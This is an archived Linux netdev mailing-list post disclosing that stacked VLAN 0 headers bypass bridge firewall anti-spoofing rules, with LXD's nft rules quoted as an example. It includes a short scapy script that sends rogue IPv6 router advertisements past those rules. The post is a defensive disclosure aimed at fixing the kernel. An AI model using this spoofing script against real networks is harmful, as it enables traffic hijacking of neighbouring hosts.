Return-Path: <netdev-owner@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 3760E24C1FB
	for <lists+netdev@lfdr.de>; Thu, 20 Aug 2020 17:18:32 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1728173AbgHTPSY (ORCPT <rfc822;lists+netdev@lfdr.de>);
        Thu, 20 Aug 2020 11:18:24 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:54438 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1728666AbgHTPSL (ORCPT
        <rfc822;netdev@vger.kernel.org>); Thu, 20 Aug 2020 11:18:11 -0400
Received: from mail-io1-xd32.google.com (mail-io1-xd32.google.com [IPv6:2607:f8b0:4864:20::d32])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id DE4EEC061385;
        Thu, 20 Aug 2020 08:18:09 -0700 (PDT)
Received: by mail-io1-xd32.google.com with SMTP id q75so2579880iod.1;
        Thu, 20 Aug 2020 08:18:09 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=Ncu5wbdwJfId7ccNlJEXWlLySe/CYLUYG+7gMN0Dm2g=;
        b=d54U6quLk+ptSAFtEIqMzFf12sJ4V7wPb2ZtbRVbLE73WG3+Q939NK2zvlE6Xrd/X8
         0jjdJ75o+aqSeGWToagXi+8p/g+ZgbswKk2haJA8Vh6bNgwykv3QvEcX8hpO2c+KG2ZJ
         wmRrY0t0vP9I5wDWU2UpgqVB3+wpAKhahIz1piiCUOcNurQDrn6s4rhVsN4efz/r1UCR
         yJveYwELc3AEsf44ZtnRp1D5aYcyisK1JjuDlONs4S/+JISR02hz9H7jXRWvROp9S/Qe
         uHPYZTk8CPCjIZtw4A2TQyKIEu2HKM2zecnA+yq+Vw2LJOtPCnLlpa0NQHljMUWan/IK
         aLZw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=Ncu5wbdwJfId7ccNlJEXWlLySe/CYLUYG+7gMN0Dm2g=;
        b=UklFocvwcKNuio5p4oFah+STu+NU1yeAlxR9qeuAbqI6wDB9RP1MykodXN8TxA6Bzn
         Xqrv3l5LF6eQI8qTLEoHmZoY5dRagUj62dDRjirmgyM4WEi2H0OYQ0x2aVuXQJDROJbL
         y98J4yCDnUyjoy+r+n7O9Dz3Yc+1ZeHkjnxzUCcxE/HiIPLuP8Drz1LWgFPaO+320Q0K
         FDzFkqi2VCjpl22UDCn6AAs8+B4VAbtXihH6Qp8hPFRh7djBNH78LmzLQKvaqXptHH2N
         ufoncQuNk/DV9lYVT0saCYQOs2M5WmEAhLOTvEgD4ElCKo0M+DtXVSeviA72rM6YXF5p
         nIrg==
X-Gm-Message-State: AOAM532u/9nDaoXxuJzube4iob+fFFZWAeWRVuJjhg1mpq+sWT6nemVR
        ZGOkV2nI3Yj/kudWfjvGma+k+Xo1nCtoARbyQHezMJm2daeQGw==
X-Google-Smtp-Source: ABdhPJzCVNtt2wVLMMbeKDv8uAyN32VamVW7iAwGfpfE9MvFlRhQWvwHeJm5nSaWhhbDKz2BC/3nzw5+D3ZqiagoG4A=
X-Received: by 2002:a6b:ab04:: with SMTP id u4mr3084853ioe.102.1597936688093;
 Thu, 20 Aug 2020 08:18:08 -0700 (PDT)
MIME-Version: 1.0
From:   Etienne Champetier <champetier.etienne@gmail.com>
Date:   Thu, 20 Aug 2020 17:17:56 +0200
Message-ID: <CAOdf3grDKBkYmt54ZAzG1zZ6zz1JXeoHSv67_Fc9-nRiY662mQ@mail.gmail.com>
Subject: bridge firewall "bypass" using VLAN 0 stacking
To:     netdev@vger.kernel.org, netfilter-devel@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Sender: netdev-owner@vger.kernel.org
Precedence: bulk
List-ID: <netdev.vger.kernel.org>
X-Mailing-List: netdev@vger.kernel.org

Hello Linux network folks,

On the input path, the kernel will remove any number of VLAN 0 headers
(priority tagging)
On the bridge firewalling path (iptables filter FORWARD or nftable
bridge table),
the kernel only looks at the current layer, except with
bridge-nf-filter-vlan-tagged=1 where it goes 1 layer deep.

This difference in behaviour makes any project using bridge
firewalling possibly vulnerable.

This was fixed in LXD via
https://github.com/lxc/lxd/commit/7599ff5834c4e0fedb3870a35ff457d342b2d1d8
Openstack Team just made their issue public:
https://bugs.launchpad.net/neutron/+bug/1884341

I haven't checked much more projects (libvirt has good rules but not
enabled by default), but I'm wondering if the current Linux behaviour
could be improved to be less surprising.

If we take the example of LXD (before the fix), enabling anti spoofing options
(security.ipv*_filtering) gives the following nft rules:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
table bridge lxd {
    chain in.u1.eth0 {
        type filter hook input priority filter; policy accept;
        iifname "vethececeb08" ether saddr != 00:16:3e:14:12:03 drop
        iifname "vethececeb08" arp saddr ether != 00:16:3e:14:12:03 drop
        iifname "vethececeb08" icmpv6 type nd-neighbor-advert
@nh,528,48 != 95530783235 drop
        iifname "vethececeb08" arp saddr ip != 10.242.217.2 drop
        iifname "vethececeb08" ip saddr 0.0.0.0 ip daddr
255.255.255.255 udp dport 67 accept
        iifname "vethececeb08" ip saddr != 10.242.217.2 drop
        iifname "vethececeb08" ip6 saddr fe80::/10 ip6 daddr ff02::1:2
udp dport 547 accept
        iifname "vethececeb08" ip6 saddr fe80::/10 ip6 daddr ff02::2
icmpv6 type nd-router-solicit accept
        iifname "vethececeb08" icmpv6 type nd-neighbor-advert
@nh,384,128 != 336637795894033326396171405568628756995 drop
        iifname "vethececeb08" ip6 saddr !=
fd42:14c6:68bf:9774:216:3eff:fe14:1203 drop
        iifname "vethececeb08" icmpv6 type nd-router-advert drop
    }

    chain fwd.u1.eth0 {
        type filter hook forward priority filter; policy accept;
        iifname "vethececeb08" ether saddr != 00:16:3e:14:12:03 drop
        iifname "vethececeb08" arp saddr ether != 00:16:3e:14:12:03 drop
        iifname "vethececeb08" icmpv6 type nd-neighbor-advert
@nh,528,48 != 95530783235 drop
        iifname "vethececeb08" arp saddr ip != 10.242.217.2 drop
        iifname "vethececeb08" ip saddr != 10.242.217.2 drop
        iifname "vethececeb08" ip6 saddr !=
fd42:14c6:68bf:9774:216:3eff:fe14:1203 drop
        iifname "vethececeb08" icmpv6 type nd-neighbor-advert
@nh,384,128 != 336637795894033326396171405568628756995 drop
        iifname "vethececeb08" icmpv6 type nd-router-advert drop
    }
...
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Some (many) people expect those rules to prevent ARP/IPv4/IPv6
spoofing, but they don't protect either the host or the Linux
neighbours.

Here is a simple scapy script to send router advertisements
encapsulated in 2 VLAN 0 headers. This will bypass all those rules but
be accepted:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ra  = Ether()/Dot1Q(vlan=0)/Dot1Q(vlan=0)
ra /= IPv6(dst='ff02::1')
ra /= ICMPv6ND_RA(chlim=64, prf='High', routerlifetime=1800)
ra /= ICMPv6NDOptSrcLLAddr(lladdr=get_if_hwaddr('eth0'))
ra /= ICMPv6NDOptPrefixInfo(prefix="2001:db8:1::", prefixlen=64,
validlifetime=1810, preferredlifetime=1800)
sendp(ra)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(this also works with 'Dot1AD(vlan=0)')

Some server NICs (at least Cisco UCS) use priority tagging by default
so just dropping VLAN 0 traffic is not an option, but here are some
questions / thoughts:

- should the input path drop packets with stacked VLAN 0 ?

- should there be a sysctl to not remove VLAN 0 on the input path ?
VLAN 0 stacking might allow to bypass anti spoofing / DHCP & NDP guard
on some switches in some configuration,
If your network doesn't use priority tagging there is no reason to
accept such traffic.

- should the bridge path have the same behaviour as the input path and
"remove" all the VLAN 0 headers by default ? (that would fix all
projects using bridge firewalling at once)

- are there any other headers that are automatically removed on the
input path that would allow a similar "bypass" ?

Best
Etienne Champetier
